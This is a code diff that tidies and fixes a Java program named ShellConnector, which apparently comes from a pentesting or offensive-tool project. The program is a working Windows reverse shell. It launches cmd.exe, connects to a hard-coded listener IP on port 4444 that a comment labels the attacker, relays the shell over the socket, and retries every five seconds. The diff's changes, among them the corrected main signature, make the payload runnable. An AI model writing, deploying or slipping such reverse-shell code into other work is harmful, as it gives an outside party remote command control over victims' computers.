@@ -10,25 +10,30 @@ import java.net.UnknownHostException;
 
 public class ShellConnector {
 
-    public static void main() {
-        boolean ConnectingToHost = true;
-        InetAddress myIp = null;//discover IP
+    public static void main(String[] args) {
+        boolean connectingToHost = true;
+        InetAddress myIp = null; // discover IP
+
         try {
             myIp = InetAddress.getLocalHost();
         } catch (UnknownHostException e) {
             throw new RuntimeException(e);
         }
-        String host = "192.168.1.92";//Listener IP
-        int port = 4444; //Listener port
-        System.out.println("Device IP:" + myIp);
+
+        String host = "192.168.1.92"; // Listener (attacker) IP
+        int port = 4444; // Listener port
+
+        System.out.println("Device IP: " + myIp);
         System.out.println("Attempting to connect to: " + host + ":" + port);
-        while (ConnectingToHost) {
+
+        while (connectingToHost) {
             try {
 
-                //run cmd.exe
+                // Run cmd.exe
                 Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
 
                 Socket socket = new Socket(host, port);
+
                 InputStream processInput = process.getInputStream();
                 OutputStream processOutput = process.getOutputStream();
                 InputStream socketInput = socket.getInputStream();
@@ -59,7 +64,7 @@ public class ShellConnector {
                 socket.close();
                 System.out.println("Shell closed");
 
-            }catch(Exception e){
+            } catch (Exception e) {
                 System.err.println("Reverse shell error: " + e.getMessage());
                 try {
                     Thread.sleep(5000);
@@ -68,5 +73,5 @@ public class ShellConnector {
                 }
             }
         }
-       }
     }
+}
